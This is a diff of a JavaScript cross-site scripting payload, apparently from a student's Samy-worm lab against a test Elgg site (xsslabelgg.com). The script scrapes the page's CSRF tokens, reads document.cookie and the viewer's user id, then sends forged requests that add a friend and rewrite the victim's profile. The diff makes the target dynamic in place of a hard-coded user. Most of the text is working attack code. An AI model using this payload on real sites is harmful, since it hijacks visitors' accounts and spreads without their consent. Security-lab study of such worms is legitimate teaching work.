@@ -1,12 +1,10 @@
+// Task 6: For everyone
+// Enze Xu
 console.log("Hello I am the attacker!");
-//console.log(document.all[35].attributes[0].nodeValue);
-//console.log(document.all[33].attributes[0].nodeValue);
-//console.log(document.getElementsByClassName("elgg-menu-content")[2].href);
-//console.log(document.all[39].attributes[0].nodeValue);
 
 let __elgg_ts = document.getElementsByClassName("elgg-menu-content")[2].href.substr(50, 10);
 let __elgg_token = document.getElementsByClassName("elgg-menu-content")[2].href.substr(74, 22);
-let samy_id = String(47);
+let target_id = document.getElementsByClassName("photo u-photo")[0].src.substr(104, 2);//let samy_id = String(47);
 let cookie = document.cookie;
 let me = document.getElementsByClassName("elgg-border-plain elgg-transition")[0].alt;
 let my_id = document.getElementsByClassName("elgg-border-plain elgg-transition")[0].src.substr(104, 2);
@@ -17,11 +15,11 @@ console.log("__elgg_token = " + __elgg_token);
 console.log("me = " + me);
 console.log("my_id = " + my_id);
 
-if (me != "Samy") {
+if (my_id != target_id) {
 	// make friends
 	var Ajax1=null;
 	Ajax1=new XMLHttpRequest();
-	let http_url1 = "http://www.xsslabelgg.com/action/friends/add?friend="+samy_id+"&__elgg_ts="+__elgg_ts+"&__elgg_token="+__elgg_token;
+	let http_url1 = "http://www.xsslabelgg.com/action/friends/add?friend="+target_id+"&__elgg_ts="+__elgg_ts+"&__elgg_token="+__elgg_token;
 	console.log(http_url);
 	Ajax1.open("POST",http_url1,true);
 	Ajax1.setRequestHeader("Host","www.xsslabelgg.com");
@@ -47,5 +45,5 @@ if (me != "Samy") {
 	Ajax2.send(content);
 }
 else {
-	console.log("I am samy, I don't need to be my friend or alter my profile.");
+	console.log("I don't need to be my friend or alter my profile.");
 }
